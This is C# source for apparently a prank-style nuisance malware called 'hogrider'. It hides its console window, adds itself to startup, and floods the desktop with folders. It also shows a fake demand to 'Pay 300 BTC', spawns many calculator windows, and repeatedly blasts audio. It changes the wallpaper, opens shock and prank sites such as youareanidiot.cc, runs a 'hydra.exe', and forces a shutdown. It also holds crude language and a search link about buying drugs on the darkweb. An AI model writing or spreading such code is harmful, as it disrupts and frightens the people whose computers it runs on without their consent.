using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows;
using hogrider;


[DllImport("kernel32.dll")]
static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
const int SW_HIDE = 0;
var handle = GetConsoleWindow();
ShowWindow(handle, SW_HIDE);



string path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
string dir = path + "\\hogrider\\";

Thread.Sleep(60000 * 2); // 2 Minutes
Console.WriteLine("Timeout 2 Mins ...");

// Check if directory exists
if (Directory.Exists(dir))
{
    Console.WriteLine("Directory found, skipping installs...");
}
else
{
    Directory.CreateDirectory(dir);
    Install.Main();
}

Utils.ChangeVolume();
Utils.OpenFile(dir, "hog-rider.mp3");

Utils.DirsOnDesktop(25);
Utils.AddStartup();

Utils.MessageBoxError("Pay 300 BTC to fix ur pc", "Jerome Verbeeck x Hogriderrrr");

Thread.Sleep(6000);

for (int i = 0; i < 12; i++)
{
    Process.Start("calc");
}

Utils.OpenFile(dir, "enemy.mp3");


Utils.RemovePowerButton();

Thread.Sleep(10 * 1000);

Utils.ChangeVolume();
Utils.OpenFile(dir, "hog-rider.mp3");

for (int i = 0; i < 5; i++)
{
    Utils.OpenFile(dir, "hogrider.jpg");
    Utils.OpenFile(dir, "dance.gif");
}

Thread.Sleep(5 * 1000);

Utils.OpenUrl("https://www.google.com/search?q=How+to+buy+hasj+on+darkweb+legit+tutorial+2016&rlz=1C1GCEA_enBE992BE992&oq=How+to+buy+hasj+on+darkweb+legit+tutorial+2016&aqs=chrome..69i57.218j0j9&sourceid=chrome&ie=UTF-8");

Thread.Sleep(2 * 1000);

Utils.SetWallpaper(dir + "\\woman.png");
Utils.OpenUrl("https://preview.redd.it/06badqei8wl81.png?auto=webp&s=061916c8cf0920bcd59b05a0a22d8994d5bfd3c5");

Thread.Sleep(2000);
Utils.OpenFile(dir, "enemy.mp3");

Thread.Sleep(7 * 1000);

for (int i = 0; i < 5; i++)
{
    Utils.ChangeVolume();
    Utils.OpenFile(dir, "hog-rider.mp3");
    Thread.Sleep(1000);
}

Utils.OpenFile(dir, "hydra.exe");

Utils.ChangeVolume();
Utils.OpenFile(dir, "hog-rider.mp3");

Thread.Sleep(5000);

Utils.ChangeVolume();
Utils.OpenUrl("https://www.youtube.com/watch?v=8-NcrRzH0vA"); // Among us drip

Thread.Sleep(300);
Utils.ChangeVolume();
Utils.OpenUrl("https://www.youtube.com/watch?v=DmxwCxV2CfA"); // Bad piggies

Thread.Sleep(12000);
Utils.OpenUrl("https://piv.pivpiv.dk/");

Thread.Sleep(5000);
Utils.OpenUrl("https://youareanidiot.cc/");


Utils.MessageBoxError("Error... U fucked up", "Windows XP Error reporter");


Utils.ShutDown();